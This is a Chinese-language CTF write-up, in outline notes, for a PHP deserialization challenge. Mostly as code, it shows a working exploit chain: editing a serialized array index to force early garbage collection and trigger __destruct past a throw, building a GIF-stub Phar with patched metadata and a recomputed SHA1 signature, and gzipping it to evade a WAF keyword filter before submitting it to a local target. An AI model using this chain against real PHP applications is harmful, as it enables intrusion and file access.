# 思路
	- 使用提前GC绕过throw触发`__destruct`，从而实现利用反序列化实现文件读写
	- 使用Phar文件实现创建getflag类读取flag
	- 使用gzip压缩绕过针对Phar文件的WAF检测
- # 反序列化
	- 最前方有throw阻碍__destruct的进行，需要使用 ((64b5744d-1d6c-43e5-95d5-2121b31d0d57)) 绕过
	- ```php
	  $o = new A();
	  $o -> config = $_POST["config"];
	  $o = [$o, 1, 114514];
	  $payload = serialize($o);
	  $payload = str_replace('i:2;i:114514;', 'i:0;i:114514;', $payload);
	  echo "xxxs". "tart";
	  
	  echo urlencode($payload);
	  
	  echo "xxxstop";
	  ```
- # Phar文件构造
	- 首先创建一个最简单的phar文件，注意metadata应该是一个array，便于后面进行快速GC
		- ```php
		  <?php
		  //反序列化payload构造
		  $o = new getflag();
		  $o = [$o, 114514]; // 一个array
		  //打开phar文件
		  @unlink("phar.phar");
		  $phar = new Phar("phar.phar"); //生成时后缀名必须为phar
		  $phar->startBuffering();
		  $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
		  
		  //放入对象
		  $phar->setMetadata($o);
		  
		  //添加压缩的文件（test为其中的内容）
		  $phar->addFromString("test.txt", "test114514");
		  $phar->stopBuffering();
		  
		  ?>
		  ```
	- 然后修改phar文件，修改sha1哈希，并使用`gzip phar.phar`压缩phar文件，提交即可
		- ```python
		  
		  base_get("http://127.0.0.1:8081/a.php")
		  
		  with open("test/phar.phar", "rb") as f:
		      content = f.read()
		      print(content)
		      content = content.replace(b"i:1;i:114514;", b"i:0;i:114514;")
		      content = content[:-28] + sha1_hash(content[:-28]) + content[-8:]
		      print(content)
		      with open("modified.phar", "wb") as out:
		          out.write(content)
		  
		  shell.exec("gzip modified.phar")
		  
		  with open("modified.phar.gz", "rb") as f:
		      s = f.read()
		      if result:= re.search(b"(get|flag|post|php|filter|base64|rot13|read|data)", s):
		          print(result)
		          print(s)
		      print(submit(fileread_payload("w"), s))
		      print(submit(fileread_payload("r"), "phar://./tmp/a.txt/test.txt"))
		  
		  _ = shell.exec("rm modified.phar.gz")
		  
		  ```